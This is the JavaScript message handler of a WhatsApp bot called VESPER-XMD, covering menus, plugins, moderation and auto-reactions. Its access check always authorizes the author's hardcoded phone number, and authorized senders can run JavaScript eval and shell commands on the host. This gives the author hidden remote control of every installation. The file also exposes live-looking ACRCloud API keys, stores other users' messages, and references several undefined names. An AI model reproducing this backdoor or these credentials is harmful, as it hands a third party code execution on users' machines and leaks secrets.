    /*
 * Give credits to Kevindev
 Contact me on +256742932677
 Coding sounds lounder 
*/

require('./start/Core/developer');
const fs = require('fs');
const util = require("util");
const moment = require("moment-timezone");
const path = require('path');
const axios = require('axios')
const devKelvin = '256742932677';
const cheerio = require('cheerio')
const os = require('os');
const { performance } = require("perf_hooks");
const acrcloud = require ('acrcloud');
const lolcatjs = require('lolcatjs');
const timezones = global.timezones || "Africa/Kampala";
const more = String.fromCharCode(8206);
const readmore = more.repeat(4001);
const {
  spawn,
  exec, 
  execSync 
} = require('child_process');

const { 
  default:
  baileys,
  proto, 
  generateWAMessage,
  getDevice,
  generateWAMessageFromContent,
  getContentType, 
  prepareWAMessageMedia
} = require("@whiskeysockets/baileys");
const { 
      smsg,
      formatSize,
      isUrl,
      generateMessageTag,
      getBuffer,
      getSizeMedia,
      runtime,
      fetchJson,
      sleep 
    } = require('./start/lib/myfunction');

const { 
getSetting,
updateSetting,
getAllSettings,
getSudo,
addSudo,
removeSudo,
settingsManager,
hasSudo
} = require('./start/Core/settingManager');

const PluginManager = require('./start/lib/PluginManager');

const { 
    handleAntiDelete,
    handleLinkViolation,
    checkAndHandleLinks,
    handleAntiTag,
    handleAntiEdit,
    handleMessageStore 
} = require('./start/kevin');

const { handleAutoReact } = require('./start/kelvinCmds/autoreact');
const { handleAutoRead } = require('./start/kelvinCmds/autoread');
const { handleAutoRecording } = require('./start/kelvinCmds/autorecord');
const { handleAutoTyping } = require('./start/kelvinCmds/autotyping');
const { handleAIChatbot } = require('./start/kelvinCmds/chatbot');


// Menu Images - KelvinTech Style
let kelvinkid1, kelvinkid2, kelvinkid3, kelvinkid4, kelvinkid5;

try {
    // Create directory if it doesn't exist
    const imagesDir = "./start/lib/Media/Images";
    if (!fs.existsSync(imagesDir)) {
        fs.mkdirSync(imagesDir, { recursive: true });
        console.log("📁 Created Media/Images directory");
    }
    
    // Load images
    kelvinkid1 = fs.readFileSync("./start/lib/Media/Images/Vesper1.jpg");
    kelvinkid2 = fs.readFileSync("./start/lib/Media/Images/Vesper2.jpg");
    kelvinkid3 = fs.readFileSync("./start/lib/Media/Images/Vesper3.jpg");
    kelvinkid4 = fs.readFileSync("./start/lib/Media/Images/Vesper4.jpg");
    kelvinkid5 = fs.readFileSync("./start/lib/Media/Images/Vesper5.jpg");
} catch (err) {
    console.log("Menu images not found - use .setmenuimage to add them");
}
//Shazam
const acr = new acrcloud({
    host: 'identify-eu-west-1.acrcloud.com',
    access_key: '882a7ef12dc0dc408f70a2f3f4724340',
    access_secret: 'qVvKAxknV7bUdtxjXS22b5ssvWYxpnVndhy2isXP'
});

// ephoto function 
async function ephoto(url, texk) {
      let form = new FormData();
      let gT = await axios.get(url, {
        headers: {
          "user-agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
        },
      });
      let $ = cheerio.load(gT.data);
      let text = texk;
      let token = $("input[name=token]").val();
      let build_server = $("input[name=build_server]").val();
      let build_server_id = $("input[name=build_server_id]").val();
      form.append("text[]", text);
      form.append("token", token);
      form.append("build_server", build_server);
      form.append("build_server_id", build_server_id);
      let res = await axios({
        url: url,
        method: "POST",
        data: form,
        headers: {
          Accept: "*/*",
          "Accept-Language": "en-US,en;q=0.9",
          "user-agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
          cookie: gT.headers["set-cookie"]?.join("; "),
          "Content-Type": "multipart/form-data",
        },
      });
      let $$ = cheerio.load(res.data);
      let json = JSON.parse($$("input[name=form_value_input]").val());
      json["text[]"] = json.text;
      delete json.text;
      let { data } = await axios.post(
        "https://en.ephoto360.com/effect/create-image",
        new URLSearchParams(json),
        {
          headers: {
            "user-agent":
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
            cookie: gT.headers["set-cookie"].join("; "),
          },
        }
      );
      return build_server + data.image;
 }
 async function saveStatusMessage(m) {
  try {
    if (!m.quoted || m.quoted.chat !== 'status@broadcast') {
      return reply('*Please reply to a status message!*');
    }
    await m.quoted.copyNForward(m.chat, true);
    kelvin.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

    console.log('Status saved successfully!');
  } catch (error) {
    console.error('Failed to save status message:', error);
    reply(`Error: ${error.message}`);
  }
}
// Function to fetch MP3 download URL
async function fetchMp3DownloadUrl(link) {
  const fetchDownloadUrl1 = async (videoUrl) => {
    const apiUrl = `https://api.nekolabs.my.id/downloader/youtube/play/v1?q=${encodeURIComponent(videoUrl)}`;
    try {
      const response = await axios.get(apiUrl);
      if (response.status !== 200 || !response.data.success) {
        throw new Error('Failed to fetch from NekoLabs API');
      }
      return response.data.result.downloadUrl;
    } catch (error) {
      console.error('Error with NekoLabs API:', error.message);
      throw error;
    }
  };
 
  try {
    const downloadUrl = await fetchDownloadUrl1(link);
    return downloadUrl;
  } catch (error) {
    console.error('Failed to fetch MP3 download URL:', error);
    throw error;
  }
}  

// Active Users Tracking Functions
function addUserMessage(groupJid, userJid) {
    try {
        if (!global.db.data.groups) global.db.data.groups = {};
        if (!global.db.data.groups[groupJid]) {
            global.db.data.groups[groupJid] = {
                activeUsers: {}
            };
        }
        
        if (!global.db.data.groups[groupJid].activeUsers) {
            global.db.data.groups[groupJid].activeUsers = {};
        }
        
        if (!global.db.data.groups[groupJid].activeUsers[userJid]) {
            global.db.data.groups[groupJid].activeUsers[userJid] = {
                count: 0,
                lastActive: Date.now()
            };
        }
        
        global.db.data.groups[groupJid].activeUsers[userJid].count++;
        global.db.data.groups[groupJid].activeUsers[userJid].lastActive = Date.now();
        
        return true;
    } catch (error) {
        console.error('Error adding user message:', error);
        return false;
    }
}

function getActiveUsers(groupJid, limit = 10) {
    try {
        if (!global.db.data.groups || !global.db.data.groups[groupJid] || !global.db.data.groups[groupJid].activeUsers) {
            return [];
        }
        
        const users = Object.entries(global.db.data.groups[groupJid].activeUsers)
            .map(([jid, data]) => ({
                jid: jid,
                count: data.count,
                lastActive: data.lastActive
            }))
            .sort((a, b) => b.count - a.count)
            .slice(0, limit);
        
        return users;
    } catch (error) {
        console.error('Error getting active users:', error);
        return [];
    }
}

function clearActiveUsers(groupJid = null) {
    try {
        if (groupJid) {
            // Clear specific group
            if (global.db.data.groups && global.db.data.groups[groupJid]) {
                global.db.data.groups[groupJid].activeUsers = {};
            }
        } else {
            // Clear all groups
            if (global.db.data.groups) {
                Object.keys(global.db.data.groups).forEach(gid => {
                    global.db.data.groups[gid].activeUsers = {};
                });
            }
        }
        return true;
    } catch (error) {
        console.error('Error clearing active users:', error);
        return false;
    }
}

function getInactiveUsers(groupJid, allParticipants) {
    try {
        if (!global.db.data.groups || !global.db.data.groups[groupJid] || !global.db.data.groups[groupJid].activeUsers) {
            return allParticipants || [];
        }
        
        const activeJids = Object.keys(global.db.data.groups[groupJid].activeUsers);
        const inactiveUsers = allParticipants.filter(jid => !activeJids.includes(jid));
        
        return inactiveUsers;
    } catch (error) {
        console.error('Error getting inactive users:', error);
        return allParticipants || [];
    }
}



module.exports = client = async (kelvin, m, chatUpdate, store) => {
  try {
    const body = (
      m.mtype === "conversation" ? m.message.conversation :
      m.mtype === "imageMessage" ? m.message.imageMessage.caption :
      m.mtype === "videoMessage" ? m.message.videoMessage.caption :
      m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
      m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
      m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
      m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
      m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
      m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
      m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || 
                                         m.message.listResponseMessage?.singleSelectReply.selectedRowId || 
                                         m.text : ""
    );
    
const botNumber = await kelvin.decodeJid(kelvin.user.id);

let prefix = "."; // Default prefix

// Load prefix from settings manager
try {
    // Get prefix from database, default to "." if not found
    prefix = getSetting(botNumber, 'prefix', '.');
} catch (error) {
    console.error('Error loading prefix from settings:', error);
    prefix = "."; // Fallback to default
}
// Load alwaysonline from settings manager
try {
    const alwaysonlineSetting = getSetting(botNumber, 'alwaysonline');
    // Handle different possible values (boolean, string 'true'/'false', or undefined)
    if (alwaysonlineSetting === undefined) {
        global.alwaysonline = false; // Default value
    } else if (typeof alwaysonlineSetting === 'boolean') {
        global.alwaysonline = alwaysonlineSetting;
    } else if (typeof alwaysonlineSetting === 'string') {
        global.alwaysonline = alwaysonlineSetting.toLowerCase() === 'true';
    } else {
        global.alwaysonline = false; // Fallback
    }
} catch (error) {
    console.error('Error loading alwaysonline from settings:', error);
    global.alwaysonline = false; // Default fallback
}
const isCmd = body && typeof body === 'string' && body.startsWith(prefix);
const trimmedBody = isCmd ? body.slice(prefix.length).trimStart() : "";
const command = isCmd && trimmedBody ? trimmedBody.split(/\s+/).shift().toLowerCase() : "";
const args = isCmd ? body.slice(prefix.length).trim().split(/\s+/).slice(1) : [];
const text = args.join(" ");
    
    const sender = m.key.fromMe ? kelvin.user.id.split(":")[0] + "@s.whatsapp.net" || kelvin.user.id : m.key.participant || m.key.remoteJid;
    const senderNumber = sender.split('@')[0];
    const budy = (typeof m.text === 'string' ? m.text : '');
    
    const from = m.key.remoteJid;
    const senderId = m.key.participant || from; // gets the actual sender JID
// database 
    const isGroup = from.endsWith("@g.us");
    const contributor = JSON.parse(fs.readFileSync('./start/lib/database/owner.json'));
    

function checkAccess(sender) {
    const normalizedSender = sender.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    
    if (kelvin.public === true) {
        return true;
    }
    
    // Bot is in private mode, check authorization
    const sudoUsers = getSudo(botNumber) || [];
    const authorizedNumbers = [
        botNumber,
        devKelvin,
        ...(global.owner || []),
        ...sudoUsers
    ].map(num => num.replace(/[^0-9]/g, "") + "@s.whatsapp.net");
    
    // Check if sender is in authorized list
    return authorizedNumbers.includes(normalizedSender);
}

const Access = checkAccess(m.sender);
    
    const pushname = m.pushName || "No Name";
    const quoted = m.quoted ? m.quoted : m;
    const mime = (quoted.msg || quoted).mimetype || '';
    const qmsg = (quoted.msg || quoted);
    const isMedia = /image|video|sticker|audio/.test(mime);

  async function isAdminKelvin(kelvin, chatId, senderId) {
        try {
            const groupMetadata = await kelvin.groupMetadata(chatId);
            
            const botId = kelvin.user.id.split(':')[0] + '@s.whatsapp.net';
            
            const participant = groupMetadata.participants.find(p => 
                p.id === senderId || 
                p.id === senderId.replace('@s.whatsapp.net', '@lid') ||
                p.id === senderId.replace('@lid', '@s.whatsapp.net')
            );
            
            const bot = groupMetadata.participants.find(p => 
                p.id === botId || 
                p.id === botId.replace('@s.whatsapp.net', '@lid')
            );
            
            const isBotAdmin = bot && (bot.admin === 'admin' || bot.admin === 'superadmin');
            const isSenderAdmin = participant && (participant.admin === 'admin' || participant.admin === 'superadmin');

            if (!bot) {
                return { isSenderAdmin, isBotAdmin: true };
            }

            return { isSenderAdmin, isBotAdmin };
        } catch (error) {
            console.error('Error in isAdmin:', error);
            return { isSenderAdmin: false, isBotAdmin: false };
        }
}
// calculate amdim status 
let isSenderAdmin = false;
let isBotAdmin = false;

if (isGroup && m.sender) {
    try {
        // Call isAdminKelvin to get actual boolean values
        const adminResult = await isAdminKelvin(kelvin, from, senderId);
        isSenderAdmin = adminResult.isSenderAdmin;
        isBotAdmin = adminResult.isBotAdmin;
        
    } catch (error) {
        console.error('Error checking admin status:', error);
        isSenderAdmin = false;
        isBotAdmin = false;
    }
}
// ============================================
    let groupMetadata = null
if (isGroup) {
  try {
    groupMetadata = await kelvin.groupMetadata(m.chat)
  } catch (e) {
    console.log("Failed to get group metadata")
  }
}

const groupName = isGroup && groupMetadata ? groupMetadata.subject : ""


if (m.message && !m.message.protocolMessage) {
        handleMessageStore(m);
    }
    
  
    if (m.message?.protocolMessage?.type === 0) {
        console.log('[System] Delete event detected');
        await handleAntiDelete(m, kelvin);
    }
    
    
    if (m.message && !m.key.fromMe) {
        await handleAutoReact(m, kelvin).catch(console.error);
    }
    
    
    if (m.message && !m.key.fromMe) {
        await handleAutoRead(m, kelvin).catch(console.error);
    }
    
    
    if (m.message && !m.key.fromMe) {
        await handleAutoRecording(m, kelvin).catch(console.error);
    }
    
    
    if (m.message && !m.key.fromMe) {
        await handleAutoTyping(m, kelvin).catch(console.error);
    }
    
   if (m.message?.protocolMessage?.editedMessage) {
    await handleAntiEdit(m, kelvin);
} 

   if (m.isGroup && body && !m.key.fromMe) {
    await checkAndHandleLinks(kelvin, {
        key: m.key,
        message: m.message
    }, isSenderAdmin, botNumber); 
}

if (m.isGroup && m.message && !m.key.fromMe) {
    // Check if message has mentions
    const mentionedUsers = m.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
    if (mentionedUsers.length > 0) {
        await handleAntiTag(m, kelvin);
    }
} 

 if ((m.mtype || '').includes("groupStatusMentionMessage") && m.isGroup) {
    if (!isGroupAdmins && !Access) {
        try {
            
            await kelvin.sendMessage(m.chat, {
                delete: {
                    remoteJid: m.chat,
                    fromMe: false,
                    id: m.key.id,
                    participant: m.sender
                }
            });
            console.log(`✅ Deleted status mention from ${m.sender}`);
        } catch (error) {
            console.log('❌ Failed to delete status mention:', error);
        }
    }
}
// Apply alwaysonline setting
if (global.alwaysonline === true || global.alwaysonline === 'true') {
    if (m.message && !m.key.fromMe) {
        try {
            await kelvin.sendPresenceUpdate("available", from);
            await delay(1000); // 1-second delay
        } catch (error) {
            // Silently handle error - don't spam console
        }
    }
} else {
    // Default behavior - send unavailable presence
    if (m.message && !m.key.fromMe) {
        try {
            await kelvin.sendPresenceUpdate("unavailable", from);
            await delay(1000); // 1-second delay
        } catch (error) {
            // Silently handle error
        }
    }
}
    await handleAIChatbot(m, kelvin, body, from, isGroup, botNumber, isCmd, prefix);
    
    const time = moment.tz("Asia/Makassar").format("HH:mm:ss");
    
    //================== [ CONSOLE LOG] ==================//
    const timezones = "Asia/Makassar"; 
    const dayz = moment(Date.now()).tz(timezones).locale('en').format('dddd');
    const timez = moment(Date.now()).tz(timezones).locale('en').format('HH:mm:ss z');
    const datez = moment(Date.now()).tz(timezones).format("DD/MM/YYYY");

    if (m.message) {
      lolcatjs.fromString(`┏━━━━━━━━━━━━━『  VESPER-XMD  』━━━━━━━━━━━━━─`);
      lolcatjs.fromString(`»  Sent Time: ${dayz}, ${timez}`);
      lolcatjs.fromString(`»  Date: ${datez}`);
      lolcatjs.fromString(`»  Message Type: ${m.mtype || 'N/A'}`);
      lolcatjs.fromString(`»  Sender Name: ${pushname || 'N/A'}`);
      lolcatjs.fromString(`»  Chat ID: ${m.chat?.split('@')[0] || 'N/A'}`);
      
      if (isGroup) {
        lolcatjs.fromString(`»  Group: ${groupName || 'N/A'}`);
        lolcatjs.fromString(`»  Group JID: ${m.chat?.split('@')[0] || 'N/A'}`);
      }
      
      lolcatjs.fromString(`»  Message: ${budy || 'N/A'}`);
      lolcatjs.fromString('┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━─ ⳹\n\n');
    }
    //<================================================>//
  
    // Create context object for plugins
    const reply = (text) => m.reply(text);
    

const context = {
    kelvin,
    m,
    reply,
    store,
    prefix,
    command,
    args,
    acr,
    text,
    trimmedBody,
    isCmd,
    sender,
    senderNumber,
    pushname,
    Access,
    getSetting,
    getAllSettings,
    updateSetting,
    addSudo,
    hasSudo,
    removeSudo,
    getSudo,
    getInactiveUsers,
    getActiveUsers,
    addUserMessage,
    isCreator: Access,
    isGroup,
    groupName,
    isBotAdmin,
    isSenderAdmin,
    quoted,
    saveStatusMessage,
    fetchMp3DownloadUrl,
    mime,
    qmsg,
    isMedia,
    body: budy,
    botNumber,
    from,
    ephoto,
    sleep,
    fetchJson,
    getBuffer,
    getDevice,
    formatSize,
    timezones,
    isUrl,
    runtime,
    match: command,
    mess: global.mess,
    global: global,
    mentionedJid: m.mentionedJid || [],
    pluginManager: global.pluginManager
};
    
const formatMemory = (memory) => {
    return memory < 1024 * 1024 * 1024
        ? Math.round(memory / 1024 / 1024) + ' MB'
        : Math.round(memory / 1024 / 1024 / 1024) + ' GB';
};

const progressBar = (used, total, size = 6) => {
    let percentage = Math.round((used / total) * size);
    let bar = '█'.repeat(percentage) + '░'.repeat(size - percentage);
    return `[${bar}] ${Math.round((used / total) * 100)}%`;
};

const generateMenu = (plugins, ownername, prefixz, modeStatus, versions, latensie, readmore) => {
    const memoryUsage = process.memoryUsage();
    const botUsedMemory = memoryUsage.heapUsed;
    const totalMemory = os.totalmem();
    const systemUsedMemory = totalMemory - os.freemem();

    // Count total unique commands across all plugins
    let totalCommands = 0;
    const uniqueCommands = new Set();
    for (const category in plugins) {
        plugins[category].forEach(plugin => {
            if (plugin.command && plugin.command.length > 0) {
                uniqueCommands.add(plugin.command[0]); 
            }
        });
    }
    totalCommands = uniqueCommands.size;

        let menu = `┌─❖ *VESPER-XMD* ❖─\n`;
menu += `├─• ᴜsᴇʀ: ${getSetting(botNumber, 'ownername', 'Not set')}\n`;
menu += `├─• ʙᴏᴛ: ${getSetting(botNumber, 'botname', 'Vesper-Xmd')}\n`;
menu += `├─• ᴍᴏᴅᴇ: ${kelvin.public ? 'ᴘᴜʟʙɪᴄ' : 'ᴘʀɪᴠᴀᴛᴇ'}\n`;
menu += `├─• ᴘʀᴇғɪx: [ ${prefixz} ]\n`;
menu += `├─• ᴄᴍᴅs: ${totalCommands}+\n`;
menu += `├─• ᴠᴇʀsɪᴏɴ: ${versions}\n`;
menu += `├─• sᴘᴇᴇᴅ: ${latensie.toFixed(4)} ms\n`;
menu += `├─• 𝚁𝙰𝙼: ${progressBar(systemUsedMemory, totalMemory)}\n`;
menu += `└─• ᴅᴇᴠ: ☘ ᴋᴇʟᴠɪɴ ᴛᴇᴄʜ ☘\n`;
menu += `${readmore}\n`;
    for (const category in plugins) {
        menu += `┌─❖  *${category.toUpperCase()} MENU* ❖─\n`;
        plugins[category].forEach(plugin => {
            if (plugin.command && plugin.command.length > 0) {
                menu += `├─❏ ${plugin.command[0]}\n`;
            }
        });
        menu += `└─❖\n\n`;
    }
    return menu;
};

const loadMenuPlugins = (directory) => {
    const plugins = {};
    
    if (!fs.existsSync(directory)) {
        console.error(`Directory ${directory} does not exist`);
        return plugins;
    }

    const files = fs.readdirSync(directory);
    files.forEach(file => {
        if (file.endsWith('.js')) {
            const filePath = path.join(directory, file);
            try {
                delete require.cache[require.resolve(filePath)];
                const pluginModule = require(filePath);
                
                // Handle both array and object exports
                const pluginArray = Array.isArray(pluginModule) ? pluginModule : [pluginModule];
                
                const category = path.basename(file, '.js'); // Extract filename without extension
                if (!plugins[category]) {
                    plugins[category] = [];
                }
                
                plugins[category].push(...pluginArray); // Spread array to push each plugin individually
            } catch (error) {
                console.error(`Error loading plugin at ${filePath}:`, error);
            }
        }
    });

    return plugins;
};
    // Handle commands via plugin system
    if (isCmd && command) {
        const result = await global.pluginManager.executeCommand(context, command);
        
        if (!result.found) {
            switch (command) {
                case 'menu': {
    const startTime = performance.now();
    await m.reply("*Loading menu*...");
    const endTime = performance.now();
    const latensie = endTime - startTime;
    
    const ownername = getSetting(botNumber, 'ownername', 'Not set');
    const prefixz = prefix;  
    const modeStatus = "online";
    const versions = "v1.0.0"; 
    
    // Load plugins
    const pluginsDir = path.join(__dirname, 'KelvinPlugins'); 
    const plugins = loadMenuPlugins(pluginsDir);
    
    // Generate menu
    const menulist = generateMenu(plugins, ownername, prefixz, modeStatus, versions, latensie, readmore);
    
    // Get random menu image
    const menuImages = [kelvinkid1, kelvinkid2, kelvinkid3, kelvinkid4, kelvinkid5];
    const kelvinkids = menuImages[Math.floor(Math.random() * menuImages.length)];
    
    // Send menu
    if (kelvinkids) {
        await kelvin.sendMessage(m.chat, {
            image: kelvinkids,
            caption: menulist,
        }, { quoted: m });
    } else {
        // Fallback
        await kelvin.sendMessage(m.chat, {
            image: { url: "https://i.ibb.co/2W0H9Jq/avatar-contact.png" },
            caption: menulist,
        }, { quoted: m });
    }
    break;
}
                
                case 'reloadplugins': {
                    if (!Access) return reply('Owner only command!');
                    try {
                        const pluginsDir = path.join(__dirname, 'KelvinPlugins');
                        const count = global.pluginManager.reloadPlugins(pluginsDir);
                        reply(`✅ Reloaded ${count} plugins successfully!`);
                    } catch (error) {
                        reply(` Failed to reload plugins: ${error.message}`);
                    }
                    break;
                }
                
                case 'plugins': {
                    if (!Access) return reply('Owner only command!');
                    const plugins = global.pluginManager.getAllPlugins();
                    let pluginList = '*LOADED PLUGINS*\n\n';
                    
                    for (const [category, pluginArray] of Object.entries(plugins)) {
                        pluginList += `*${category.toUpperCase()}*:\n`;
                        pluginArray.forEach(plugin => {
                            pluginList += `• ${plugin.command[0]}`;
                            if (plugin.command.length > 1) {
                                pluginList += ` (${plugin.command.slice(1).join(', ')})`;
                            }
                            pluginList += '\n';
                        });
                        pluginList += '\n';
                    }
                    
                    reply(pluginList);
                    break;
                }
                
                default: {
                    // Handle eval/exec commands (owner only)
                    if (budy.startsWith('>')) {
                        if (!Access) return;
                        try {
                            let evaled = await eval(budy.slice(2));
                            if (typeof evaled !== 'string') evaled = util.inspect(evaled);
                            await m.reply(evaled);
                        } catch (err) {
                            m.reply(String(err));
                        }
                    }
                        
                    if (budy.startsWith('<')) {
                        if (!Access) return;
                        let kode = budy.trim().split(/ +/)[0];
                        let teks;
                        try {
                            teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${text}})()`);
                        } catch (e) {
                            teks = e;
                        } finally {
                            await m.reply(util.format(teks));
                        }
                    }

                    if (budy.startsWith('-')) {
                        if (!Access) return;         
                        if (text == "rm -rf *") return m.reply("😹");
                        exec(budy.slice(2), (err, stdout) => {
                            if (err) return m.reply(`${err}`);
                            if (stdout) return m.reply(stdout);
                        });
                    }
                    
               
                }
            }
        } else if (!result.success) {
            // Command found but errored
            reply(`Error executing ${command}: ${result.error}`);
        }
    }
    
  } catch (err) {
    console.log(util.format(err));
  }
};

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
  require('fs').unwatchFile(file);
  console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
  delete require.cache[file];
  require(file);
});